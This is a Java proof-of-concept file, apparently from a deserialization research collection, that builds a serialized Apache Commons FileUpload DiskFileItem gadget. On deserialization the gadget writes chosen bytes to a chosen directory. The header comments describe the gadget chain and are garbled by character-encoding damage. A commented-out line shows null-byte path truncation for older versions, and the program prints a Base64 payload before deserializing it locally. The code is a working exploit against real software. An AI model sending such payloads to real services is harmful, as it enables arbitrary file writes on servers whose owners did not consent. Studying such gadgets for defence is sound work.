package Apache_Upload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

/**
 * FileItem ��ʾ�� multipart/form-data POST �����н��յ����ļ������
 * DiskFileItem �� FileItem ��ʵ���࣬������װһ��������Ϣʵ���е�ȫ����Ŀ���� FileUploadBase#parseRequest ����ʱ���з�װ
 * ���ϴ����ļ���Ŀ�Ƚ�Сʱ��ֱ�ӱ������ڴ��У��ٶȱȽϿ죩���Ƚϴ�ʱ������ʱ�ļ�����ʽ�������ڴ�����ʱ�ļ��С�
 *
 * kick-off gadget��org.apache.commons.fileupload.disk.DiskFileItem#readObject()
 * sink gadget��org.apache.commons.fileupload.disk.DiskFileItem#getOutputStream()
 * chain gadget��org.apache.commons.beanutils.BeanComparator#compare()
 *
 * ���� DiskFileItem ���е����ԣ�
 * repository��File ���͵ĳ�Ա����������ļ����浽Ӳ���ϵĻ��������λ�á�
 * sizeThreshold���ļ���С��ֵ������������ֵ���ϴ��ļ����ᱻ������Ӳ���ϡ�
 * fileName��ԭʼ�ļ���
 * dfos��һ�� DeferredFileOutputStream �������� OutputStream ��д��
 * dfosFile��һ�� File ��������������л��Ĳ���
 * DiskFileItem ��д�� readObject ����ʵ�����Լ����߼�,��������л�һ�������ݵ� DiskFileItem �࣬�Ϳ��ܻᴥ���ļ���д��������
 *
 * DiskFileItem�����л��߼���
 * --ͨ��dfos.isInMemory()�����ж��ļ������Ƿ����ڴ��У�Ҳ����ͨ���ж� written �ĳ��Ⱥ� threshold ��ֵ���ȴ�С�����д�������ֵ����ᱻд�����ļ��У��ǾͲ��Ǵ����ڴ�����
 * --������ڴ��У������� dfos.getData() ������ȡ���� dfos ��Ա���� memoryOutputStream �� ByteArrayOutputStream ������� cachedContent �С�
 * --��������ڴ��У���Ὣ cachedContent ��Ϊ�գ�Ȼ�� dfosFile ��ֵΪ dfos �ĳ�Ա���� outputFile ����
 * --���� dfos �� transient ���εģ����ܱ������л��������ܱ������л����� byte �������͵� cachedContent �� File ����� dfosFile��
 *DiskFileItem�����л��߼���
 * --���� getOutputStream() ������ȡ OutputStream ����ʵ������ new ��һ�� DeferredFileOutputStream �����ļ�·��ʹ�� tempFile�����Ϊ��ʹ�� repository�������Ϊ����ʹ�� System.getProperty("java.io.tmpdir")���ļ���ʹ�� format("upload_%s_%s.tmp", UID, getUniqueId()) ����������ļ�����
 * --��� cachedContent ��Ϊ�գ���ֱ�� write������ dfosFile �ļ����ݿ����� OutputStream ��д������ɾ����
 *
 * DiskFileItem.readObject()
 *     DiskFileItem.getOutputStream()
 *             DeferredFileOutputStream.write()
 */
public class FileUploadForWrite {

    public static String fileName = "FileUploadForWrite.bin";

    public static void main(String[] args) throws Exception {

        // �����ļ�д��Ŀ¼ File �����Լ��ļ�д������
        String charset = "UTF-8";
        byte[] bytes   = "hahaha".getBytes(charset);

        // �� 1.3 �汾���£�����ʹ�� \0 �ض�
        //File repository = new File("/Users/phoebe/Downloads/123.txt\0");

        // �� 1.3.1 �����ϣ�ֻ��ָ��Ŀ¼
		File repository = new File("D:\\TestUpload");

        // ���� dfos ����
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        // ʹ�� repository ��ʼ�������л��� DiskFileItem ����
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // ���л�ʱ writeObject Ҫ�� dfos ����Ϊ null
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);

        // ���佫 cachedContent д��
        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);

        //���л�
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(diskFileItem);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //�����л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
